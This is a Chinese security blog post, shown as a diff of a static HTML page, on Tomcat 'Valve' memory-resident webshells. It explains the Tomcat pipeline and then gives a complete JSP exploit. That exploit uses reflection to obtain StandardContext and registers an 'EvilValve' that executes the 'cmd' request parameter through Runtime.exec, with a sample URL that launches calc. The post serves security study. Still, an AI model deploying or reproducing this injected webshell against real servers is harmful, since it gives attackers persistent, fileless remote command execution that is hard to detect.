@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tomcat-value内存马 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Tomcat-value内存马</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743614">https://www.cnblogs.com/Zephyr07/articles/18743614</a></p>
+</blockquote>
+<h2 id="一-什么是value？"><a href="#一-什么是value？" class="headerlink" title="一.什么是value？"></a>一.什么是value？</h2><p>tomcat管道机制：<br>tomcat对来自客户端的请求做处理的时候，请求响应对象会先通过StandardEngine，然后再到StandardHost，紧接着StandContext，最后到StandardWrapper交给servlet，完成整个消息的处理<br>而消息在每个容器之间流转的时候，需要经过一些阀门处理，而这些阀门就是value，同样有四个基础阀门对应着每个容器，分别是StandardEngineValve，StandardHostValve,StandardContextValue，StandardWrapperValue<br>而除了这些基础阀门，tomcat是允许开发人员自行添加一些其它的阀门对消息进行相对应的处理（可以理解为对应的业务逻辑）<br>消息在不同容器之间的流转就是管道pipeline，既然可以人为添加value，那这里就有了可操作性，我们可以添加恶意的value来去进行shell<br>并且在每个容器的value(s)中，value是以单链表存储的，末端永远都是basic，每次添加新的value都会添加在单链表的前面</p>
+<h2 id="二-流程分析"><a href="#二-流程分析" class="headerlink" title="二.流程分析"></a>二.流程分析</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165412951-496905591.png"></p>
+<p>pipeline中会有一个最基础的value，叫做basic，是位于整个value链的最后端也就是最后执行（在业务上面的表现是封装了具体的请求处理和输出响应）<br>首先我们先去看一Pipeline接口，因为value是Pipeline的一个部分</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165418417-1748273773.png"></p>
+<p>发现里面就有一个addvalue方法用来添加value<br>又因为addvalue的实现类是Pipeline，所以我们需要找一个可以获取它的方法<br>查找用法之后，发现了一个特别熟悉的类StandardContext，导入了这个Pipeline</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165423674-1851979353.png"></p>
+<p>然后我们就直接在StandardContext里面全局搜索look look~</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165429365-1134174599.png"></p>
+<p>然后发现getPipeline，字面意思，然后我们跟进去看一下，发现返回的就是一个pipeline</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165434175-931225988.png"></p>
+<p>然后我们看一下StandardContext中使用了getPipeline方法的getAuthenticator，这个方法的作用就是遍历pipeline管道中的所有value，当检测到value存在的话，强转成Authenticator输出<br>所以其实在这里我们能直接调用getPipeline</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardContext.getPipeline = StandardPipeline; // 二者等价</span><br></pre></td></tr></table></figure>
+
+<p>所以到这里大致流程就已经清楚了：</p>
+<ol>
+<li>反射获取StandardContext</li>
+<li>编写恶意的value</li>
+<li>然后通过StandardContext.getPipeline.addValue将恶意value注册进去</li>
+</ol>
+<h2 id="三-最后的exp："><a href="#三-最后的exp：" class="headerlink" title="三.最后的exp："></a>三.最后的exp：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Le&#x27;novo</span><br><span class="line">  Date: 2025/2/25</span><br><span class="line">  Time: 15:58</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;value内存马&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.http.HttpServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.http.HttpServletRequest&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.servlet.http.HttpServletResponse&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    class EvilValve extends ValveBase &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void invoke(Request request,Response response)throws IOException ,ServletException&#123;</span><br><span class="line">            System.out.println(&quot;111&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">            &#125;catch(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Field reqf=request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqf.setAccessible(true);</span><br><span class="line">    Request req=(Request) reqf.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(new EvilValve());</span><br><span class="line"></span><br><span class="line">    out.println(&quot;inject sucess&quot;);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后jsp访问即可执行命令：<br><a target="_blank" rel="noopener" href="http://localhost:8080/servlet_war_exploded/value.jsp?cmd=calc">http://localhost:8080/servlet_war_exploded/value.jsp?cmd=calc</a></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165507809-1426545449.png"></p>
+<h2 id="四-Filter和value的区别："><a href="#四-Filter和value的区别：" class="headerlink" title="四:Filter和value的区别："></a>四:Filter和value的区别：</h2><p>主要的区别就是作用的地方不一样<br>value在最一开始的地方就分析了是在StandardEngine，StandardHost，StandardContext，StandardWrapper之间的起到的一个阀门的作用，其实和filter过滤器也差不都<br>而filter是在servlet里面发挥作用的，一个wrapper是对应一个servlet，而wrapper是四个子容器的最后一步（listener—-&gt;filter—-&gt;servlet.service）<br>“一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。”<br>“一个 Wrapper 对应一个 Servlet。负责管理 Servlet”</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/Tomcat-servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="prev">← Tomcat-servlet内存马</a>
+    
+    
+      <a href="/2025/02/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JNDI%E7%AF%87/" class="next">java反序列化JNDI篇 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
